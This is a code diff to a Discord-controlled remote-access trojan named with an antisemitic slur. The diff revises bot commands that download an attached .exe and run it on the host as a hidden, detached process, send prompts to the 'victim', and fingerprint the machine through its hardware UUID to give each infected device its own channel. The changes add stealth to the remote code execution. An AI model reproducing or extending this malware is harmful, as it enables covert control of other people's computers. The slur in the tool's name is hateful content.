@@ -45,7 +45,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.4.1" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.4.2" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -64,31 +64,32 @@ async def fm_send(ctx, content: str, alt_content: str = None, filename: str = "o
         await ctx.send(file=discord.File(fp=buffer, filename=filename))
     else:
         await ctx.send(content)
-
+        
 @bot.command(help="Updates JewFuss using the attached .exe file. (Must be a compiled installer, not a direct JewFuss executable)")
 async def update(ctx):
     if not ctx.author.guild_permissions.administrator:
-        await ctx.send("You don't have permission to access this command.")
+        await ctx.send("You don't have permission to access this command.", ephemeral=True)
         return
-    
     if not ctx.message.attachments:
-        await ctx.send("No file attached. Please attach a `.exe` file.", empherial=True)
+        await ctx.send("No file attached. Please attach a `.exe` file.", ephemeral=True)
         return
 
     attachment = ctx.message.attachments[0]
-
     if not attachment.filename.lower().endswith(".exe"):
-        await ctx.send("Attached file must be a `.exe`.", empherial=True)
+        await ctx.send("Attached file must be a `.exe`.", ephemeral=True)
         return
 
     try:
-        save_path = os.path.join(os.path.dirname(sys.argv[0]), attachment.filename)
+        save_path = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), attachment.filename)
         await attachment.save(save_path)
-        
-        subprocess.Popen([save_path, f'--targetpath="{os.path.abspath(sys.argv[0])}"'], shell=True)
-        await ctx.send(f"Updater `{attachment.filename}` has been downloaded and executed.")
+
+        prevpath = os.path.abspath(sys.argv[0])
+        creationflags = 0x00000008 | 0x08000000 # DETACHED_PROCESS | CREATE_NO_WINDOW
+        subprocess.Popen([save_path, f"--prevpath={prevpath}"], creationflags=creationflags, close_fds=True)
+
+        await ctx.send(f"Updater `{attachment.filename}`has been downloaded and executed.")
     except Exception as e:
-        await ctx.send(f"Could not process the update. {str(e)}", empherial=True)
+        await ctx.send(f"Could not process the update. {e}")
         
 async def prompt(ctx, *, question_and_default: str = ""):
     await ctx.send("✅ Prompt sent to victim. Waiting for input...")
@@ -752,10 +753,10 @@ def compressed_device_id():
     uuid_raw = wmi.WMI().Win32_ComputerSystemProduct()[0].UUID
     return base64.b32encode(uuid.UUID(uuid_raw).bytes).decode().rstrip("=").lower()
 
-@bot.command(help="Delete and recreate bot's channel, wiping all messages")
+@bot.command(help="Delete and recreate bot's channel, wiping all messages, and channel permssions")
 async def init(ctx):
     if not ctx.author.guild_permissions.administrator:
-        await ctx.send("You don't have permission to initialize the configuration.")
+        await ctx.send("You don't have permission to initialize this channel.")
         return
 
     category_name = f"{re.sub(r'[^a-zA-Z0-9_-]', '', os.environ.get('COMPUTERNAME', 'UnknownDevice'))}-{compressed_device_id()}"
